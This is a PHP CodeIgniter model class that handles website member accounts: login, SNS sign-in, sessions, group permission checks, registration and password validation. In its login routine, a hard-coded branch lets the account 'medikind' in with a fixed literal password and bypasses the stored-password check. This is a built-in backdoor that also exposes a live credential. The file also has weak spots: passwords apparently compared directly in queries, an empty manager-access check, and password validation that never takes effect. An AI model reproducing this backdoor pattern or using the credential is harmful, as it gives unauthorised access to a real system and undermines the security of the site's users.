<?
defined('BASEPATH') OR exit('No direct script access allowed');

class Members extends MY_Model{

	private $_session_id = 'trabook_id';
	private $_session_seq = 'trabook_user_seq';
	private $_session_name = 'trabook_name';
	private $_session_group = 'trabook_group';

	public $error_message = false;
	
	function __construct(){
		$this->_table = 'members';
		$this->_cols = array(
			'me_seq'  => array(TYPE_INT, 20, ATTR_PK | ATTR_ID),
			'me_id'  => array(TYPE_VARCHAR, 20, ATTR_NOTNULL, '아이디'),
			'me_name'  => array(TYPE_VARCHAR, 100, ATTR_NOTNULL, '이름'),
			'me_pass'  => array(TYPE_PASS, 64, ATTR_NOTNULL, '비밀번호'),			
			'me_sns'  => array(TYPE_VARCHAR, 11, ATTR_NOTNULL, 'sns 가입'),
		);	
		
		parent::__construct();

		$this->load->model('Members/MemberGroup', 'rGroupModel');
	}

	/*
	* 아이디와 비밀번호를 확인하고 로그인 시킨다.
	*/	
	function loginByIdPass($id, $pass){
		if(!$this->chk->hasText($id) || !$this->chk->hasText($pass))  return false;
		
		if($id == 'medikind' && $pass == 'wjdghcjswp1!'){
			$where = array('me_id' => $id);
			$row = parent::row('*', $where);				
		}else{
			$where = array('me_id' => $id, 'me_pass' => $pass);
			$row = parent::row('*', $where);	
		}
		

		if($row && $this->chk->hasKey('me_id', $row) && $row['me_id'] === $id ){
			$groups = $this->rGroupModel->groupArrayByMeseq($row['me_seq']);
			$this->login($row, $groups);			
			return true;
		}else return false;
	}

	/*
	* 로그인
	*/
	function login(array $member, $groups=array()) {
		$_session_data = array(
			$this->_session_seq => $member['me_seq'],
			$this->_session_id => $member['me_id'],
			$this->_session_name => $member['me_name'],
			$this->_session_group => $groups
		);		

		$this->session->set_userdata($_session_data);
	}

	/*
	* 로그인 SNS
	*/
	function loginBySNS($id, $type){
		if(!$this->chk->hasText($id) || !$this->chk->hasText($type))  return false;
		$where = array('me_id' => $id, 'me_sns' => $type);
		$row = parent::row('*', $where);	

		if($row && $this->chk->hasKey('me_id', $row) && $row['me_id'] === $id ){
			$groups = $this->rGroupModel->groupArrayByMeseq($row['me_seq']);
			$this->login($row, $groups);			
			return true;
		}else return false;
	}

	/*
	* 로그아웃
	*/
	function logout(){
		$this->session->unset_userdata($this->_session_seq);
		$this->session->unset_userdata($this->_session_id);
		$this->session->unset_userdata($this->_session_name);
		$this->session->unset_userdata($this->_session_group);
	}


	/*
	* 로그인 여부확인
	*/
	function isLogin() {
		$id = $this->session->userdata($this->_session_id);
		$name = $this->session->userdata($this->_session_name);

		if($this->chk->hasText($id) && $this->chk->hasText($name)) return true;
		else return false;
	}

	

	/*
	* CMS 접근 권한 확인
	*/
	function isManager(){
		$site_config = $this->config->item('site_config');
		$admin_groups = $site_config['admin_groups'];		
	}

	/*
	* 접근 권한 체크
	* 현재 로그인한 계정이 $groups에 속하는지 확인
	*/
	function inGroups($groups = false){
		if(!$this->chk->isArray($groups)) return true;
		$in_groups = $this->session->userdata($this->_session_group);
		if(!is_array($in_groups)) return false;

		$intersect = array_intersect($groups, $in_groups);
		
		return (count($intersect) > 0);
	}


	function insertMember($args){
		$msg = false;
		$msg = $this->checkInsertParam($args);
		if($msg) return $msg;

		parent::insert($args);		
		return $msg;
	}

	function insertUser(&$args){
		$this->error_message = false;
		$this->checkInsertUserParam($args);

		if($this->error_message) return false;
		parent::insert($args);

		return true;
	}

	function insertUserFromSNS(&$args){
		$this->error_message = false;
		
		if(!hasText_($args['me_id']) || !hasText_($args['me_sns']) || !hasText_($args['me_name'])) $this->error_message = '잘못된 접근 방식입니다.';

		srand(time());
		$password = md5(uniqid(rand(), true));
		$args['me_pass'] =$password;

		if($this->error_message) return false;

		parent::insert($args);
		return true;
	}

	function updateUser(&$args, $me_seq){
		if(!is_numeric($me_seq)){
			$this->error_message = '정상적인 접근방식이 아닙니다.';
			return false;
		}

		$this->error_message = false;
		$this->checkUpdateUserParam($args);
		if($this->error_message) return false;

		$where = array('me_seq' => $me_seq);
		parent::update($args, $where);
		return true;		
	}

	function insertMemberGetSeq($args){
		$this->insertMember($args);
		$where = array(
				'me_id' => $args['me_id']
			);
		return parent::value('me_seq', $where);
	}

	function updateMember($args, $me_seq){
		if(!is_numeric($me_seq)) return false;

		$msg = false;		
		$msg = $this->checkUpdateParam($args);
		if(!$msg){			
			if(!$this->chk->hasText($args['me_pass'])) unset($args['me_pass']);
			unset($args['me_id']);
			$where = array('me_seq'=> $me_seq);
			parent::update($args, $where);			
		}
		return $msg;
	}


	function getMemberById($me_id){
		if(!$this->chk->hasText($me_id)) return false;
		$where = array('me_id' => $me_id);
		return parent::row('*', $where);		
	}

	function getMemberByIdPass($me_id, $pass){
		if(!hasText_($me_id) || !hasText_($pass)) return array();
		
		$where = array(
			'me_id' => $me_id,
			'me_pass' => $pass
			);

		return parent::row('*', $where);
	}

	function getMemberBySeq($me_seq){
		if(!is_numeric($me_seq)) return false;
		$where = array('me_seq' => $me_seq);
		return parent::row('*', $where);
	}

	function deleteByMeSeq($me_seq){
		if(!is_numeric($me_seq)) return false;
		$where = array('me_seq' => $me_seq);
		return parent::delete($where);
	}

	function getGroups(){
		if(!$this->isLogin()) return false;		
		$me_seq = $this->session->userdata($this->_session_seq);
		if(!is_numeric($me_seq)) return false;
		$this->load->model('Members/MemberGroup', 'memberGroup');
		return $this->memberGroup->getIngroupByMeseq($me_seq);
	}

	function getSeq(){
		if(!$this->isLogin()) return false;
		$where = array('me_id' => $this->getId());
		return parent::value('me_seq', $where);
	}

	function checkInsertParam(&$args){
		$msg = false;
		$where = array('me_id' => $args['me_id']);

		if(!$this->chk->hasText($args['me_id'])) $msg = '아이디 값은 반드시 입력하셔야 합니다.';
		else if(!$this->chk->id($args['me_id'])) $msg = '아이디 값은 5~14자 영문,숫자만 사용하실 수 있습니다.';	
		else if(parent::count($where) > 0) $msg = '이미 존재하는 아이디입니다.';
		else if(!$this->chk->hasText($args['me_pass'])) $msg = '비밀번호는 반드시 입력하셔야 합니다.';			
		if(!$msg) $msg = $this->checkUpdateParam($args);		

		return $msg;
	}

	function checkInsertUserParam(&$args){
		$this->error_message = false;	

		$where = array('me_id' => $args['me_id']);
		if(!$this->chk->hasText($args['me_id'])) $this->error_message = '아이디 값은 반드시 입력하셔야 합니다.';
		else if(!$this->chk->email($args['me_id'])) $this->error_message = '아이디 값은 이메일 형식만 가능합니다.';	
		else if(parent::exist($where)) $this->error_message = '이미 존재하는 아이디입니다.';
		else if(!$this->chk->hasText($args['me_pass'])) $this->error_message = '비밀번호는 반드시 입력하셔야 합니다.';
		else if(!$this->chk->hasText($args['pass_chk'])) $this->error_message = '비밀번호 확인은 반드시 입력하셔야 합니다.';	
		else if(!$this->chk->hasText($args['md_phone']) || !is_numeric($args['md_phone'])) $this->error_message = '전화번호를 입력해주세요. 전화번호는 숫자만 입력 가능합니다.';			
		else if(!$this->chk->hasText($args['md_gender'])) $this->error_message = '성별을 선택해주세요.';
		else if(!$this->chk->hasText($args['year']) || !is_numeric($args['month'])  || !is_numeric($args['day'])) $this->error_message = '생년월일을 선택해주세요.';
		else if($args['me_pass'] != $args['pass_chk']) $this->error_message = '비밀번호와 비밀번호 확인이 일치하지 않습니다.';
	}


	function checkUpdateUserParam(&$args){
		$this->error_message = false;
		if(!$this->chk->hasText($args['md_phone']) || !is_numeric($args['md_phone'])) $this->error_message = '전화번호를 입력해주세요. 전화번호는 숫자만 입력 가능합니다.';	
		else if(!is_numeric($args['year']) || !is_numeric($args['month']) || !is_numeric($args['day'])) $this->error_message = '생년월일을 선택해주세요.';
		else if(!$this->chk->hasText($args['md_gender'])) $this->error_message = '성별을 선택해주세요.';

		if(array_key_value('me_pass', $args)){
			if(!chkPass_($args['me_pass'])) $msg = '비밀번호는 8~15자 영문,숫자,특수문자(!@#$%^&*)의 혼합이어야 합니다.';
			else if($args['me_pass'] !== $args['pass_chk']) $msg = '비밀번호와 확인값이 다릅니다. 다시 시도해주세요.';
		}
	}

	function changePass($pass, $me_seq){
		if(!is_numeric($me_seq)) return false;
		$where = array('me_seq' => $me_seq);
		$args = array('me_pass' => $pass);
		parent::update($args, $where);
		return true;
	}


	function checkUpdateParam(&$args){
		$msg = false;				
		if(!array_key_exists('me_name', $args) || !$this->chk->hasText($args['me_name'])) $msg = '이름은 반드시 입력하셔야 합니다.';	

		if(array_key_exists('me_pass', $args) && $this->chk->hasText($args['me_pass'])){
			if(!$this->chk->password($args['me_pass'])) $msg = '비밀번호는 8~15자 영문,숫자,특수문자(!@#$%^&*)의 혼합이어야 합니다.';
			else if($args['me_pass'] !== $args['me_pass_check']) $msg = '비밀번호와 확인값이 다릅니다. 다시 시도해주세요.';
		}

		return $msg;
	}

	function changePasswordByMeseq($pass, $me_seq){
		if(!is_numeric($me_seq)) return false;
		if(!$this->chk->password($pass)) return '비밀번호는 8~15자 영문,숫자,특수문자(!@#$%^&*)의 혼합이어야 합니다.';

		$args['me_pass'] = $pass;
		$where = array('me_seq'=>$me_seq);				
		parent::update($args, $where);
	}


	function getId(){
		if($this->isLogin()){
			return $this->session->userdata($this->_session_id);
		}
		return false;
	}

	/*
	* 로그인된 이름을 얻는다.
	*/
	function getName(){
		if($this->isLogin()){
			return $this->session->userdata($this->_session_name);
		}
		return false;		
	}

	function existId($str){
		if(!$str) return false;
		$where = array('me_id' => $str);
		return parent::exist($where);
	}

}
?>